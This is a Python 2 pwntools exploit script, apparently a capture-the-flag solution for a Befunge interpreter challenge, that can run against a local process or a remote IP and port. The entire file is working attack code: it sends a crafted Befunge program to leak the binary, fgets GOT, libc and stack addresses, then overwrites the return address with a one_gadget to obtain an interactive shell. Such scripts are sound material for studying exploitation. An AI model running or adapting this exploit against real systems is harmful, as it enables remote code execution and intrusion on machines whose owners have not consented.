#!/usr/bin/env python2

import sys
import argparse
from pwn import *

def generate_befunge(payload):
  n = 78
  blocks = [payload[i:i+n] for i in range(0, len(payload), n)]

  direction = ">"
  final_payload = ""
  for block in blocks:
    if direction == ">":
      final_payload += ">" + block + "v"
      direction = "<"

    else:
      final_payload += "v" + block[::-1].ljust(78," ") + "<"
      direction = ">"

    final_payload += "\n"

  final_payload += "\n" * (26 - len(final_payload.split("\n")))
  return final_payload

def exploit():

    p.clean()

    # Send malicious code
    payload  = "&&g," * 0x10                        # Leak addr byte * 0x10
    payload += ("0" + ("&&&p" * 0x8) + "0g,") * 0x8 # Leak addr
    payload += ("00" + ("&&&p" * 0x8) + "0p") * 0x8 # Write null at addr
    payload += ("&0" + ("&&&p" * 0x8) + "0p") * 0x8 # Write value at addr
    payload += "<>"
    payload = generate_befunge(payload)
    p.sendline(payload)
    p.recvuntil("> " * 24)

    # Leak binary
    binary = ""
    for i in xrange(8):
      binary_offset = -0x38 + i
      p.sendline(str(binary_offset))
      p.sendline(str(0))
      binary += p.recv(1)
    binary = u64(binary)
    log.info("binary : %s" % hex(binary))

    # Leak fgets@got.plt
    fgets = ""
    for i in xrange(8):
      fgets_offset = -0xc8 + i
      p.sendline(str(fgets_offset))
      p.sendline(str(0))
      fgets += p.recv(1)
    fgets = u64(fgets)
    log.info("fgets() : %s" % hex(fgets))

    # libc base + environ
    base = fgets - 0x67310
    environ = base + 0x39af38 + 0x1000
    log.info("libc : %s" % hex(base))
    log.info("environ : %s" % hex(environ))

    # Leak stack
    program = binary + 0x38
    stack = ""
    for offset in xrange(8):
      environ_offset = p64(environ - program + offset)
      for i in xrange(8):
        p.sendline(str(u8(environ_offset[i])))
        p.sendline(str(2016 + i)) # Virtual stack location
        p.sendline(str(0))
      stack += p.recv(1)
    stack = u64(stack)
    log.info("Stack : %s" % hex(stack))

    # Ret address
    ret = stack - 0xf0
    log.info("Ret addr : %s" % hex(ret))

    # Overwrite ret + 0x30 with 0x0
    for offset in xrange(8):
      ret_30_offset = p64(ret + 0x38 - program + offset)
      for i in xrange(8):
          p.sendline(str(u8(ret_30_offset[i])))
          p.sendline(str(2016 + i + 0x8)) # Virtual stack location
          p.sendline(str(0))

    # Overwrite ret with one_gadget
    one_gadget = p64(base + 0x3f32a)
    for offset in xrange(8):
      ret_offset = p64(ret - program + offset)
      p.sendline(str(ord(one_gadget[offset])))
      for i in xrange(8):
          p.sendline(str(u8(ret_offset[i])))
          p.sendline(str(2016 + i + 0x8)) # Virtual stack location
          p.sendline(str(0))

    # Leak contents
    p.interactive()


if __name__ == '__main__':

    # Argument parser
    parser = argparse.ArgumentParser(description='Exploit Dev Template')
    parser.add_argument('binary', help="Binary to exploit")
    parser.add_argument('-e', '--env', choices=['local', 'remote'],
                        help='Default : local',
                        default='local')

    parser.add_argument('-i', help="remote IP")
    parser.add_argument('-p', help="remote port")

    args = parser.parse_args()

    # Validate that an IP and port has been specified for remote env
    if args.env == "remote" and (args.i == None or args.p == None):
        print "%s : missing IP and/or port" % sys.argv[0]
        exit()

    # Load the binary
    try:
        binary = ELF(args.binary)
    except:
        log.warn("Issue opening %s" % args.binary)
        exit()

    try:
        libc = binary.libc
    except:
        log.warn("Libc not loaded.")

    env = args.env
    loot = {}

    if env == "local":
        p = process([args.binary])
        log.info(util.proc.pidof(p))

    elif env == "remote":
        p = remote(args.i, args.p)

    pause()
    exploit()
